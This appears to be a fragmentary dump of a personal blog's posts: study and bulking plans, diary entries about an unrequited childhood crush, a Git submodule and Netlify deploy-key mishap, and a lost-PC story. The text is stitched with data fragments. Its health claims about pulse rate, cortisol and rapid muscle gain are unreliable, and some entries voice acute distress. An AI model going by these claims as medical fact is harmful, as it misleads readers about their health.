Again. Another month gone, another set of plans completely ignored. And this time, I’ve messed up bad.\n\nFor the past few months, I’ve done NOTHING right. No schedule, no proper routine, no discipline. I just wasted so much time, and now it’s hitting me. Hard. It’s already too late, but I need to go back offline, at least for a while, to fix things.\n\nFirst thing—IELTS. I was supposed to take the test months ago. But guess what? I didn’t even prepare. Not even a little bit. It’s not just about postponing the exam—I didn’t even study for it. Shame on me. 3 months just disappeared, and I have NOTHING to show for it. No progress. No results. Nothing. Now, no more excuses. This month, I HAVE to take IELTS and get at least a 7.0 band score. No more delays. No more “I’ll do it later.”\n\nNext—my diet and workouts. Total disaster. I was supposed to fix my routine, but instead, I ended up messing it up even more. I wasted hours at NFC, just sitting around, talking, doing nothing useful. 9 AM to 12 PM, gone, just like that. And now, looking back, I feel so stupid. That was my PRIME TIME. The most productive part of the day. And I threw it away like it was nothing.\n\nNow, I have a new plan. No running this month. No unnecessary distractions. Just strict strength training. I’ll stick to it until IELTS is done. I finally received my supplements, so that’s one thing sorted. Once I finish my refund process, I’ll add a link to this repo for future reference.\n\nAnd then there’s Vinay. A new friend, seems like a good guy. He asked me to come to NFC in the evening instead—from 5 to 7 PM—so we can train together. I don’t know if that’s a good idea, but I’ll think about it. Maybe I should talk to Manoj Anna first before switching my schedule.\n\nAnd the biggest problem—SOCIAL MEDIA. It’s ruining my focus. Every month, I say I’ll stop, but then I just go back to the same cycle. This time, no more Instagram. Snapchat? Gone from my phone. I’ll keep it on my browser extension, though. Not because I need it. Just because I don’t want to miss her snaps. Her photos. Her moments. I know it sounds stupid, but I can’t help it.\n\nThis month is CRUCIAL. If I don’t fix things now, I never will. Every time I try to get back to my old routine, something distracts me, and the streak is gone. And once the streak is gone, it’s impossible to get it back.\n\nNot this time.\n\nThis is it. One last chance to reset, refocus, and do things right.\n\n---\n\n[_FOLDER_](https://github.com/ekrishnachaitanya2004/Krishna-Site-Doc/tree/main/01APR2025)","src/content/blogs/01APR2025.md","7967343b2471abef",{"html":30,"metadata":31},"\u003Cp>Reset, Refocus, and No More Excuses\u003C/p>\n\u003Cp>Okay, this is just my monthly reminder blog.

Everything feels dim, like the intro of a horror movie where it’s raining outside and the camera slowly zooms into a lonely kid staring at nothing. I take off my earphones. It’s raining outside. A cyclone. Water everywhere. The sound of raindrops falling on some metal roof, making a loud, almost deafening sound. Everything feels strange. No one’s around me. They’re just… gone. I check my phone—11 hours of sleep. The sudden climate change makes me feel low, like something is pressing against my chest.\n\nEverything is Strange until I hear my mom’s voice. It’s 9 o’clock. I drag myself out of bed and go to her, ask her why she’s still at home. She should be at school by now. She looks at me and says, “It’s a cyclone, so there’s no school today.”\n\nI nod, but I don’t feel comfortable. Something about the silence in the house, the rain outside, the grey sky—it makes me uneasy. I just take my laptop, go straight to my room, and start reading tech news.

I don’t say anything. I just watch. And then, without a word, I go to the terrace with an umbrella, standing there, watching the rain, listening to the sounds of water hitting the ground, the rooftops, the leaves. Just feeling it all like a kid.\n\nLater, I come down, take a hot water bath, and go to bed.\n\nThen suddenly—\n\nI’m not in my bed anymore. I’m in my old house, standing in the corridor, watching the rain. The lightning is wild. The sky is cracking open with flashes of white light, but I just stand there, staring. And then, out of nowhere, I see a hand on the wall.\n\nIt’s her.\n\nHarshi.\n\nShe’s standing beside me, looking at the same clouds. I turn my head, and suddenly, I realize—I’m a kid again. And there she is, my 10-year-old Harshi, standing next to me, just like before. We’re both standing outside tuition, watching the rain, feeling the cold air against our faces.\n\nAnd then I wake up.\n\nIt wasn’t just a dream. I know that. It was a memory. I forgot to play a song before sleeping, and my iPod is dead. The rain sounds must have triggered it. I check my phone—it’s 1 AM. I step out of my room and see the rain outside. The downpour is heavy. The sky is alive with flashes of light.\n\nAnd then I remember everything.\n\nThat wasn’t just a dream. That day really happened. I remember it so clearly now. One rainy day, Harshi and I were sitting in tuition, and the sudden smell of wet mud filled the air. I loved that smell. I asked my mom if I could go outside and enjoy the rain. She agreed and sent both of us—me and Harshi—out. She said that the smell of mud could help stop nosebleeds. We both had the same issue—nosebleeds.\n\nThat day, we stood there, in the rain, side by side. I remember watching her silent smile, the way the raindrops landed on her face. She was different. Special. I wanted to hug her in that rain, hold her close, but I never had that kind of luck in my life.\n\nRemembering all of this now, I feel like something inside me is breaking. I open Snapchat. She sent a snap a week ago, sitting in a restaurant with her friend Ramana, talking about his mood.\n\nRamana.\n\nHow lucky he is. He gets to sit next to her, talk to her, laugh with her, without any effort. Just like that, he gets her kindness, her presence, for free.\n\nAnd me?\n\nI can't even exist in her world.\n\nI can't see someone else that close to her. It feels like drowning, but there’s no water. No pool.\n\nBut wait.\n\nI go to the water tank, open the cap, and lower myself inside. Just like that. I’m in a water tank. Sitting there, in complete darkness, listening to the tiny sounds of water drops echoing inside. I stay there for hours.\n\nJust sitting.\n\nThinking.\n\nCrying.\n\nRemembering.\n\nBy the time I come out, it’s 5 AM. The rain is still falling. The world is still the same.

I have been working out for a while now, but my weight gain has been slow because I was doing too much cardio. That’s why for this month, I am completely cutting out cardio and running. Just focusing 100% on lifting heavy, eating enough protein, and resting properly. My only goal is to get bigger, stronger, and better while also preparing for IELTS. After IELTS, I’ll go back to my regular training schedule.\n\nHonestly, I don’t see the point of running just to live longer or be “healthier.” There’s no meaning in extending life without a goal. I don’t want to waste my time eating tasteless food just to be “fit.” Instead, I want to bulk up and see how my body responds. I feel like all the running I’ve done has held me back from real muscle growth. I was spending hours on cardio, and my body never got the chance to grow properly.\n\nSo, until my IELTS exam is over, I’m fully committing to strength training and bulking. No bodyweight exercises, no unnecessary movement—just proper training and eating. The only thing I’m slightly worried about is losing flexibility and my pulse rate increasing at the same time, but I think I’ll figure it out.\n\n## Why I Decided to Stop Cardio?\n\nJust fuck up that heart and focus on gains. This heavy pulse is just draining my gains. Not only gains, it’s reducing my muscle growth. I just want to quit this cardio and running for this month and focus on IELTS and gains. After the IELTS exam, I’ll go back to my old schedule. Right now, I want to make sure that my body is in the best condition to lift heavier, recover faster, and pack on solid muscle mass without losing any energy in unnecessary cardio.\n\n\n## Why I Am Following This Plan\n\nApril is going to be a crucial month for me because I have two major goals:\n1. **Gaining Lean Muscle Mass** – I want to bulk up from 55kg to 60kg in a month while keeping fat gain to a minimum.\n2. **IELTS Preparation** – Since I am planning for higher studies, I need to focus on my IELTS exam, especially improving my speaking, listening, and writing skills.\n\nBalancing fitness and studies is not easy, but I have planned my entire day to make sure I stay consistent in both. Every meal I eat, every workout session I do, and every study session I complete is part of a well-structured schedule to help me achieve my goals efficiently.\n\n---\n\n## Daily Routine Breakdown\n\n### Morning Routine – Waking Up Right\n\n#### **6:00 AM – Wake Up & Hydration**\nThe first thing I do is drink a glass of warm water with lemon and honey. This helps kickstart my digestion, flush out toxins, and rehydrate my body after 7-8 hours of sleep. Hydration is very important for muscle recovery and overall health.\n\n#### **6:15 AM - 6:30 AM – Light Stretching/Yoga**\nBefore I get into my studies or workout, I spend 15 minutes stretching. This helps loosen up my muscles, improve blood circulation, and prevent injuries during workouts. It also helps me feel more awake and fresh.\n\n### Study Block 1 – IELTS Focus\n\n#### **6:30 AM - 7:00 AM – IELTS Listening Practice**\nListening is one of my weak areas, so I dedicate 30 minutes to listening to English podcasts or IELTS listening test materials. The goal is to improve my ability to understand different accents and pick up key details quickly.\n\n### Breakfast – The First Big Meal\n\n#### **7:00 AM - 7:30 AM – High-Protein Breakfast**\nBreakfast is the most important meal of my day because it fuels my body for my workout and studies. Since I want to bulk up, I ensure my breakfast is rich in **complex carbohydrates, proteins, and healthy fats.**\n\n🔹 **Option 1 (South Indian)**  \n- 4 Idlis + Sambar (High in carbs and moderate protein)\n- 2 tbsp coconut chutney (Healthy fats)\n\n🔹 **Option 2 (Oats for Sustained Energy)**  \n- Oats (80g) + Milk (200ml) + 1 tbsp Peanut Butter (Carbs: 50g, Protein: 10g)\n- 1 Boiled Egg (Protein: 6g)\n\n### Study Block 2 – IELTS Writing Practice\n\n#### **7:30 AM - 8:30 AM – IELTS Writing**\nI focus on writing essays and task 1 reports during this time. Writing consistently helps me improve my grammar and time management skills.\n\n#### **8:30 AM - 8:45 AM – Short Break**\nA quick tea or coffee break to refresh my mind before I hit the gym.\n\n### Pre-Workout & Gym Session\n\n#### **8:45 AM - 9:00 AM – Pre-Workout Meal**\nBefore hitting the gym, I eat a small meal to boost my energy levels. This meal includes:\n- **1 Banana** (Quick carbs for instant energy)\n- **5g Creatine** (Optional, helps with strength and endurance)\n- **2 Dates** (Fast-absorbing carbs to prevent fatigue)\n\n#### **9:00 AM - 12:00 PM – Gym & Strength Training**\nI follow a **progressive overload workout plan**, meaning I increase my weights gradually. My workout plan includes:\n- **Day 1:** Chest ,Shoulders, Triceps / 20mins-running\n- **Day 2:** Back , Biceps, fore-arms / 20mins-running\n- **Day 3:** Legs & Core& Abs / 20mins-running\n- **Day 4:** Chest ,Shoulders, Triceps / 20mins-running\n- **Day 5:** Back , Biceps, fore-arms / 20mins-running\n- **Day 6:** Legs & Core& Abs / 20mins-running\n\nI make sure to focus on **compound movements** (Squats, Bench Press, Deadlifts) as they help in overall muscle development.\n\n### Post-Workout & Recovery\n\n#### **12:00 PM - 12:30 PM – Post-Workout Meal**\nAfter gym, my body needs protein and carbs to recover. I eat:\n- **2 Whole Eggs + 1 Egg White** (High-quality protein for muscle repair)\n- **Rice (150g cooked) + Dal or Rajma (1 bowl)** (Carbs & protein for muscle recovery)\n- **Vegetable Curry (1 bowl) + Ghee (1 tsp)** (Healthy fats for hormone production)\n\n### Midday Study & Work Session\n\n#### **12:30 PM - 1:00 PM – Relax & Light Reading**\nThis is my time to unwind and let my body recover from the workout. I usually read books or articles related to IELTS or self-improvement.\n\n#### **1:00 PM - 2:00 PM – IELTS Reading Practice**\nReading comprehension is another crucial part of IELTS, so I spend an hour practicing different passages and answering questions.\n\n#### **2:00 PM - 2:15 PM – Hydration & Short Break**\nI make sure to drink at least **500ml of water** and take a quick walk to refresh myself before continuing my studies.\n\n#### **2:15 PM - 3:00 PM – IELTS Speaking Practice**\nI practice speaking by recording myself answering IELTS speaking test questions.

Once IELTS is done, I’ll go back to my normal training schedule with cardio. Until then, I just **want to gain 5kg of lean muscle and improve my IELTS score**. I know it’s gonna be tough, but I am 100% committed.\n\n---\n\nThis is my **full April plan**\n\n--- \n**__credits -- Openai, Jyothi rao-aka(Nithya Fitness Center), Global Fast Fit.__**\n\n---","src/content/blogs/02APR2025.md","9241a5095fa619e1",{"html":126,"metadata":127},"\u003Cp>April is here, I want to bulk up from 55kg to 60kg in a month while keeping fat gain to a minimum. I have been working out for a while now, but my weight gain has been slow because I was doing too much cardio. That’s why for this month, I am completely cutting out cardio and running. Just focusing 100% on lifting heavy, eating enough protein, and resting properly. My only goal is to get bigger, stronger, and better while also preparing for IELTS. After IELTS, I’ll go back to my regular training schedule.\u003C/p>\n\u003Cp>Honestly, I don’t see the point of running just to live longer or be “healthier.” There’s no meaning in extending life without a goal. I don’t want to waste my time eating tasteless food just to be “fit.” Instead, I want to bulk up and see how my body responds. I feel like all the running I’ve done has held me back from real muscle growth. I was spending hours on cardio, and my body never got the chance to grow properly.\u003C/p>\n\u003Cp>So, until my IELTS exam is over, I’m fully committing to strength training and bulking. No bodyweight exercises, no unnecessary movement—just proper training and eating. The only thing I’m slightly worried about is losing flexibility and my pulse rate increasing at the same time, but I think I’ll figure it out.\u003C/p>\n\u003Ch2 id=\"why-i-decided-to-stop-cardio\">Why I Decided to Stop Cardio?\u003C/h2>\n\u003Cp>Just fuck up that heart and focus on gains. This heavy pulse is just draining my gains. Not only gains, it’s reducing my muscle growth. I just want to quit this cardio and running for this month and focus on IELTS and gains. After the IELTS exam, I’ll go back to my old schedule. Right now, I want to make sure that my body is in the best condition to lift heavier, recover faster, and pack on solid muscle mass without losing any energy in unnecessary cardio.\u003C/p>\n\u003Ch2 id=\"why-i-am-following-this-plan\">Why I Am Following This Plan\u003C/h2>\n\u003Cp>April is going to be a crucial month for me because I have two major goals:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>Gaining Lean Muscle Mass\u003C/strong> – I want to bulk up from 55kg to 60kg in a month while keeping fat gain to a minimum.\u003C/li>\n\u003Cli>\u003Cstrong>IELTS Preparation\u003C/strong> – Since I am planning for higher studies, I need to focus on my IELTS exam, especially improving my speaking, listening, and writing skills.\u003C/li>\n\u003C/ol>\n\u003Cp>Balancing fitness and studies is not easy, but I have planned my entire day to make sure I stay consistent in both.

At least she is enjoying her life.\n\nMaybe if I had gone to the same college, things would have been different. Maybe we would have still talked, laughed, existed in each other’s world. But I didn't, and she doesn't even remember that I exist. And that thought... that thought drives me insane.\n\nSometimes, I feel like a complete psycho.

Why am I so desperate for someone who isn’t even thinking about me? It’s her life, her choices. She knows how to live, how to take care of herself. She is not dumb. I am the dumb one. The one who still thinks about her, who still holds on to something that was never his.\n\nI missed my chance. That’s the truth. She has moved on, and I am still stuck. Fucked up in my own head, watching her shine from a distance. She doesn’t even remember me, doesn’t know how I look at her photo at night, eyes filled with tears, fearing the thought of never seeing her again. She will never know.\n\nThen I try to think practically. From her side, why should she even care? Her life is perfect. She is happy. She is beautiful. She deserves happiness. She deserves love. But me? What am I? Nothing. Weak. Skinny. A fool drowning in memories, wasting time playing games just to escape reality. Even if, by some miracle, she came back one day, looked me in the eyes, and said she wanted me, I would still step back. Because she deserves better. Because even if I love her, even if she was the only thing that ever made sense to me, I know I’m not the right one for her.\n\nBut at least, in my dreams, she is mine. And sometimes, I just want to stay there, in my dreams, with my 10-year-old Harshi. Not this version of her—the one who has forgotten me.

It has never been normal. Not once. Not for a single day. A resting heart rate of 100 BPM—consistently. No one around me seems to care. No one takes it seriously. But I do. Because I know what it means. I know that something isn’t right.\n\nThis is not a new discovery. I first measured my pulse in 2017—101 BPM. At the time, I ignored it, thinking maybe it was temporary. But it never changed. Year after year, the numbers remained the same. I spent an entire year swimming, trying to bring it down. Nothing. A mere 90 BPM at best. Still abnormal. Why?\n\nAm I overthinking? Maybe. Or maybe no one else is thinking at all.\n\n⸻\n\nThe Connection No One Sees\n\nI decided to break this problem apart, analyze it in ways no one else would. And I found something—everything is connected, perfectly interlinked.\n\nMy Metabolism:\n\nI’ve always had a high metabolism. My body burns calories too fast, preventing me from gaining weight, from aging normally, from growing the way I should. It sounds like a gift. It isn’t. A metabolism running at full speed means my heart is working overtime, always engaged, always pumping, never resting.\n\nThe Pulse Rate:\n\nA heart rate of 100 BPM means my heart beats 100 times per minute, even when I’m resting. That’s 144,000 beats per day—millions more per year than a normal heart should endure. Theoretically, my body should be more efficient because of it. More blood flow, faster oxygen delivery, quicker responses. But at what cost?\n\nThe cost is simple: a shorter heart lifespan. The more my heart works now, the less time it will last in the future. I cannot afford that risk.\n\n\nWhat they don’t tell you about an abnormal heart rate is how it affects the mind.\n\nA constantly elevated pulse triggers the release of cortisol, the stress hormone. Cortisol keeps the body in a perpetual state of alertness, making it harder to relax, harder to sleep, harder to think clearly. This is why I experience light sleep, frequent awakenings, and—most frustrating of all—bad dreams.\n\nMore time in REM sleep means more nightmares. More stress. More exhaustion. It’s a vicious cycle, one that keeps breaking me down mentally while my body appears to function perfectly.\n\n⸻\n\nThe Only Solution\n\nI need to reset everything. My heart, my stress levels, my sleep. I need to lower my resting heart rate to 75 BPM—no exceptions.\n\nThere is only one way to do this: cardio training. Running. There is no pool here. No skating rink. Nothing that would make this process enjoyable. But it doesn’t matter. I have no other option.\n\nI have to run.\n\nThis is not just about physical health. This is about taking back control of my own mind. The elevated heart rate, the constant stress, the nightmares—these things have shaped me into someone I don’t recognize.

Yeah, that’s me right now. But I’m still gonna try because I really wanna get this all out and make sure I don’t forget anything important, even though I already feel like I forgot half of it. \n\nAnyway, so I was thinking about how things used to be, like way back, not like old-old times, but just like, you know, a few years ago when everything felt different, and it’s kinda wild how fast things change, like one day you’re just chilling and the next day, boom, everything is different, and you don’t even know when it happened, it just did. And then you try to go back and remember how things were before, and it’s like trying to remember a dream, where you kinda get bits and pieces but also it’s all blurry and weird, and you’re not even sure if you’re remembering it right or if your brain is just making stuff up. \n\nAlso, I just realized that I went on a huge tangent and totally forgot what I was even trying to say in the first place, but whatever, I guess I’ll just keep going and see where this ends up. So yeah, where was I? Oh yeah, things changing and stuff. Like, have you ever just looked at something and been like, wow, I remember when this was completely different, and now it’s just... not?

I’ve noticed some devs starring my repo, probably using my content for their own purposes. That didn’t sit right with me. If I made my entire blog repo private, Netlify wouldn’t be able to access it. So, I thought of a workaround: keeping only the blog folder in a private repo while linking it to my main site using Git submodules. It sounded perfect in theory. But reality had other plans.\n\nThe Day I Tried (and Failed) to Make My Blogs Private\n\nIt started as a simple thought—“What if I could keep my blogs private while still displaying them on my website?” At first, it sounded like an exciting challenge, a way to separate my personal content from the public repository while still maintaining the seamless experience of my AstroPaper blog. But little did I know, this single thought would turn into an exhausting battle with Git, Netlify, SSH keys, and my own patience.\n\nThe Idea That Sparked It All\n\nI had been using AstroPaper to host my blogs, and all my Markdown files were inside the src/data/blog folder of my public repository. That meant anyone could just open the repo and see all my blog posts. I didn’t like that. I wanted to keep the actual .md files in a private repository while still displaying them on my public site. The idea was simple: use Git submodules to pull the private blog content into the public repo during deployment.\n\nSo I created a new private repository, TIME-MACHINE-BLOGS, and planned to add it as a submodule inside src/data/blog. If this worked, I could write my blogs in the private repo, push them, and they would still show up on my website. I was excited, and I thought it would be an easy setup. I was wrong.\n\nThe First Attempt – Adding a Git Submodule\n\nI opened my terminal, navigated to my AstroPaper project, and ran:\n\n```\ngit submodule add -b main git@github.com:ekrishnachaitanya2004/TIME-MACHINE-BLOGS.git src/data/blog\n```\n\nIt added the submodule successfully. I committed and pushed the changes. But then, when I ran pnpm run dev, everything looked fine locally. “Perfect!” I thought. “Now let’s deploy.” I pushed the changes to Netlify, expecting a smooth build.\n\nBoom. Build failed.\n\nThe First Failure – Netlify and SSH Authentication\n\nThe error message was brutal:\n\nHost key verification failed.\nfatal: Could not read from remote repository.\nPlease make sure you have the correct access rights and the repository exists.\n\nI immediately understood the issue—Netlify’s build system couldn’t access my private repository. Since it was private, Netlify didn’t have the authentication to clone it.\n\nAfter some research, I found the solution: I needed to add an SSH deploy key to my private repo. So, I generated an SSH key:\n\n```\nssh-keygen -t rsa -b 4096 -C \"myemail@example.com\" -f netlify_deploy_key\n```\n\nThen, I copied the contents of netlify_deploy_key.pub and went to my private repository’s settings → Deploy Keys → Add Deploy Key. I pasted the key, enabled “Allow write access,” and saved it.\n\nNext, I went to Netlify’s Environment Variables and added:\n\n```\n•\tKey: NETLIFY_AUTH_SSH_KEY\n•\tValue: (pasted the private key from netlify_deploy_key)\n```\n\nI was confident now. I triggered another build.\n\nFailed again.\n\nThe Second Failure – The Infinite Submodule Loop\n\nThis time, I noticed something weird in my private repository. Instead of src/data/blog, it had src/data/blog/src/data/blog nested inside itself! Somehow, I had mistakenly added the public repository as a submodule inside the private repository. This was breaking everything.\n\nI had to remove the submodule, but Git wasn’t making it easy. Commands like:\n```\ngit submodule deinit -f -- src/data/blog\ngit rm -rf src/data/blog\ngit config --remove-section submodule.src/data/blog\n```\nall threw errors saying that the path didn’t exist or was already removed. I was stuck in a weird state where Git thought the submodule existed, but it wasn’t actually there.\n\nI tried deleting the .gitmodules file manually and committed the changes. Still, Netlify wasn’t happy.\n\nThe Third Failure – GitHub Push Protection\n\nAfter several hours of trying different fixes, I finally managed to clean up the mess and push everything again. But GitHub had a new problem for me:\n```\nremote: Push cannot contain secrets\nremote: GH013: Repository rule violations found\n```\nApparently, GitHub detected the SSH private key inside my commit history and refused to let me push. It was a security measure to prevent me from accidentally exposing sensitive information.\n\nI had deleted the key file, but GitHub still rejected my push because the file existed in previous commits. I had to rewrite commit history to erase it permanently:\n```\ngit rebase -i HEAD~5\n```\nI removed the commit containing the SSH key and force-pushed:\n```\ngit push --force origin LIVE\n```\nThe Final Breaking Point\n\nBy now, I had spent nearly an entire day fighting with Git, Netlify, and submodules. I had tried everything, and every time I thought I fixed something, a new issue popped up. I had re-added the submodule at least five times, deleted and recreated the SSH key multiple times, and rewritten my Git history twice.\n\nFinally, I asked myself:\n\n“Why am I doing this? Is this even worth it?”\n\nI took a deep breath and made the toughest decision of the day.\n\nI removed the submodule entirely and decided to go back to the old way of just keeping my blogs inside the public repo.\n```\ngit rm -rf src/data/blog\ngit commit -m \"Removed submodule\"\ngit push origin LIVE\n```\nLessons Learned\n\nThis entire experience taught me so many things:\n\n\t1.\tGit Submodules Are a Nightmare – They seem simple but cause endless headaches when combined with private repositories and CI/CD pipelines.\n\t2.\tNetlify SSH Authentication Is Tricky – Setting up deploy keys is possible but not worth the hassle for something simple like blog deployment.\n\t3.\tGitHub Push Protection Is a Blessing (and a Curse) – It saved me from exposing secrets, but also made it difficult to clean up.\n\t4.\tSometimes, the Old Way Is the Best Way – After trying so hard to automate everything, I realized that my old system—just committing blogs directly—was the easiest and most reliable.\n\n---\n\nAt the end of the day, I wasted an entire day on something that didn’t even work. I could’ve spent this time actually writing blogs instead of trying to hide them.\n\nTo my future self, if you ever think about doing this again, DON’T. Just stick with the simple way. Some things don’t need to be complicated.\n\nAnd if you ever get tempted to use Git submodules again… DON’T DO IT.\n\nEvery log and outputs are Stored-- just Checkit out ,If Needed [Link](https://github.com/ekrishnachaitanya2004/Krishna-Site-Doc/tree/3dc893a2d98811e2b8475e434d69a324f14d388c/22MAR2025)\n\n---","src/content/blogs/23MAR2025.md","c53295cce96fc7c3",{"html":642,"metadata":643},"\u003Cblockquote>\n\u003Cp>\u003Cstrong>Note:\u003C/strong>\u003Cbr>\nBut here’s the thing—I must make my blog posts private.

The original note, exactly as it was, is stored below, capturing every bit of the chaos and emotion I felt that day.\n\nSo, January 5, 2021—I was finally going to college after being trapped at home for months. Nitheesh called and told me to come because Jaswanth was coming the next day. Bro, I was dying to get out. Staying home felt like some jail sentence. I missed all the crazy fun we used to have before lockdown. So, without thinking much, I got ready.\n\nNitheesh came to pick me up, honking like a maniac—peep peep! I rushed down, and boom—shock of my life. This dude, who was once fit, was now a proper fatboy. Blue N95 mask covering half his face, but still, I could see the difference. I laughed so hard, and he got pissed. But whatever, we left.\n\nCollege felt like an alternate dimension. Everyone had masks on, and I couldn’t recognize a single soul. But weirdly, everyone recognized me. Guess I hadn’t changed at all. We went straight to our old classroom, same spot—the last third bench. But something felt off. The place was too empty. Most of our batchmates were missing—probably still scared of COVID.\n\nThen came the biggest shock. ALL our first-year teachers? GONE. Vanished. Manu sir, Srinivas sir, MVP sir—poof! I had seen some new faces during online classes, but I thought they were just guest lecturers or something. Nope. Our actual teachers were replaced. We had come expecting to see them, but now? Nothing. Just strangers.\n\nThe mood was dead. We looked at each other, and without saying much, we decided—screw this, we’re leaving. We told “VP” we were going out for lunch, then casually threw our bags into the next building and walked out like kings. We went to Badri, sat there, and continued Uncharted. It felt good, like old times.\n\nThen… I went home. That’s when the horror began.\n\nI stepped into my room, stretched a little, turned towards my desk—and stopped. Wait. Something was wrong. WHERE IS MY PC?!\n\nPanic. Full-body sweat. My heart stopped. I ran to my mom, shouting, “WHERE IS MY PC?! WHERE?!” And she, with the calmness of a serial killer, said, “Oh, I gave it to my friend.”\n\nWHAT?! WHAT THE ACTUAL FUCK?!\n\nI froze. She just… GAVE IT AWAY?! MY PC?! WHY?! HOW?! My brain stopped working. My hands are cold. My heart? Running up.The Pulse just RaisingUP Again. It wasn’t just a PC. It was my entire life. My memories. My secrets. My past. My Harshi .Everything I had hidden, locked away, safe from the world—just gone.\n\nI looked at my table. Empty. A dead, lifeless space where my world used to exist. My hard disk, my files, everything ripped away. And the worst part? The CPU. The damn CPU……\n\nInside that CPU was my secret Hiding Place. Six years of my life buried in there. Her notes. Her handwriting. That stupid little paper where she had once written “I LOVE INDIA” in her messy, cute handwriting. My notes—some real crazy shit. Things no one was ever meant to see. Ever.\n\nMy head was spinning. I felt like throwing up. Someone else had it now. Some random stranger could open it, scroll through my memories, listen to my recordings, read my thoughts like flipping through a diary. My video calls, my passwords, my personal world—exposed.\n\nAnd then, another horrifying thought struck me like lightning—What if my mom finds out what was inside?\n\nShe wouldn’t just kill me. She’d erase me from existence. Forget being grounded. I’d be wiped off the family tree. My whole life flashed before my eyes, every single mistake leading up to this moment.\n\nI stood there, staring at the empty table, my body frozen in time. I wanted to scream. I wanted to run. But there was nowhere to go.\n\nWhat should I do?\nNo answer.\nJust silence.\nJust the feeling that today… was the worst day of my life.\n\nI was terrified. My body felt like a ticking time bomb, ready to explode any second. My mind was running in circles, chasing every worst-case scenario. I had to act normal. I had to pretend like nothing was wrong. So, casually—very casually—I asked my mom, “What all did you give away?”\n\nShe listed some random things—old books, a few electronics. My heart was pounding. Did she see it? Did she open it? What about my diary? What about Harshi’s old class notebook? If my mom had seen them, she would have already killed me. So maybe… maybe she didn’t. Maybe her friend took everything as it was.\n\nBut that was even worse. Because now, her friend had it. And at some point, she was definitely going to open it.\n\nThe thought made my stomach twist. What if she read everything? What if she found those pages? My notes. My memories. My secrets. She would see everything—the things I never meant for anyone to see. And the moment she did, she would call my mom. And then I was dead.\n\nI couldn’t sleep. Every time I closed my eyes, I saw it happening. My mom picking up the phone. Her face changing. Her voice rising. Then, her footsteps outside my door. Then… nothing.\n\nIf my mom’s friend called her in the morning and told her everything—I wouldn’t even wake up. She’d kill me in my sleep. I’d never see the morning again….—\n\nI woke up with a Shake, heart Beating, sweat All over. A dream… it was just a dream. But my hands were still shaking. The fear, the panic—it all felt too real.\n\nAnd then, my eyes landed on the table. Empty. No CPU. No books. No notes.\n\nYesterday wasn’t a dream.\n\nMy mind was a mess, flashing between the past and present. The last time I had seen that note—Harshi’s note—was during our 5th-grade final exams. She had given me her Maths notebook to copy the notes, and inside, on a loose sheet, in her messy handwriting, she had written:\n\n“I LOVE INDIA.”\n\nJust like that, she was gone. She left school. I didn’t even get to say goodbye. That note, that notebook, was the only thing I had left of her… until I called her again in 8th grade. And now? Gone.\n\nI felt a lump in my throat. Crying. Sobbing. Shaking. Not because of the CPU, not because of the files—because of that one note. I held onto it for so long, and now some random person had it. What should I do?\n\nI didn’t sleep. I pretended to sleep, thinking, planning, spiraling. I didn’t even realize when I actually fell asleep.\n\nI woke up at 7 AM, still pretending, still processing. Silence. My mom was talking to my dad about the market. “Today is Wednesday. We should go today. Sunday will be too crowded. COVID times, you know.”\n\nSo far… everything seemed fine.\n\nWhen they left for the market, I called Nitheesh. Told him everything. He laughed.\n“Bro, just die. If she sees that stuff, she’s gonna kill you anyway. Just die first. Simple.”\n\nNot helping, man. Not helping.\n\nI needed to act fast. I grabbed my mom’s phone. Checked the call history. Yesterday, 10 AM.\n\nRevathi Ma’am.\n\nI knew her. She was a computer teacher.\n\nMy World sank. She was the one who took my PC.\n\nI called her. She picked up. I didn’t say a word. I just listened. Waiting. Hoping. If she had opened it, she would definitely talk about it. But she didn’t.\n\nFinally, I asked about my PC. She told me my mom gave it away because I was “wasting time in front of it.” Great. Just great.\n\nI took a deep breath. I had to be careful now.\n“Actually, ma’am, I had some important backups. Photos, files… I need my extra hard disk. There were two inside—one for the OS and one extra. I just need that extra one.”\n\nShe laughed.\n“Oh, that? I sold it.”\n\nWHAT?!\n\nMy hands went cold.\n“Where did you sell it?”\n\n“It was some wholesale shop. Not sure exactly. But they said they send them to schools after formatting and reinstalling Windows.”\n\nSafe.\n\nThey would never find out what was inside. But at what cost? Everything was gone.\n\nI called Rohit. Told him everything. He came over and took me to Central Park, where most second-hand computer shops were. I called Revathi Ma’am again, trying to ask where exactly she sold it. She hesitated. I knew if I pushed too hard, she would definitely tell my mom.\n\nSo I hung up.\n\nThen, we asked every shop. “Did anyone sell an Acer PC yesterday?”\n\n“No.”\n“No.”\n“No.”\n\nEvery shop. Nothing.\n\nThe PC didn’t matter anymore. The note. The memories. The videos. The recordings.\n\nWhy was this happening to me?\n\nI went home, exhausted, drained. And there she was. My mom. Waiting.\n\n“Where were you?”\n“Why did you call her about the PC?”\n\nShe looked at me like I was an idiot.\n“I told her to take it away. Just focus on JEE Mains first. After your admission, I’ll buy you a new one. This time, you can build your own PC, like you always wanted.”\n\nShe wasn’t angry. She did this for me.\n\nAnd I should have been happy. But inside, I felt nothing.\n\nBecause Harshi’s note. The photos. The call recordings.\n\nEverything was gone.\n\n\n---\n\n[Original](https://github.com/ekrishnachaitanya2004/Krishna-Site-Doc/tree/main/25APR2022)","src/content/blogs/25042022.md","3fb11ddf9f764c91",{"html":731,"metadata":732},"\u003Cblockquote>\n\u003Cp>\u003Cstrong>Note:\u003C/strong>\u003Cbr>\nWritten in April 2022, this is a raw, unfiltered piece straight from my mind—messy handwriting, unevenly remembered thoughts, and all.

My Harshi .Everything I had hidden, locked away, safe from the world—just gone.\u003C/p>\n\u003Cp>I looked at my table. Empty. A dead, lifeless space where my world used to exist. My hard disk, my files, everything ripped away. And the worst part? The CPU. The damn CPU……\u003C/p>\n\u003Cp>Inside that CPU was my secret Hiding Place. Six years of my life buried in there. Her notes. Her handwriting. That stupid little paper where she had once written “I LOVE INDIA” in her messy, cute handwriting. My notes—some real crazy shit. Things no one was ever meant to see. Ever.\u003C/p>\n\u003Cp>My head was spinning. I felt like throwing up. Someone else had it now. Some random stranger could open it, scroll through my memories, listen to my recordings, read my thoughts like flipping through a diary. My video calls, my passwords, my personal world—exposed.\u003C/p>\n\u003Cp>And then, another horrifying thought struck me like lightning—What if my mom finds out what was inside?\u003C/p>\n\u003Cp>She wouldn’t just kill me. She’d erase me from existence. Forget being grounded. I’d be wiped off the family tree. My whole life flashed before my eyes, every single mistake leading up to this moment.\u003C/p>\n\u003Cp>I stood there, staring at the empty table, my body frozen in time. I wanted to scream. I wanted to run. But there was nowhere to go.\u003C/p>\n\u003Cp>What should I do?\nNo answer.\nJust 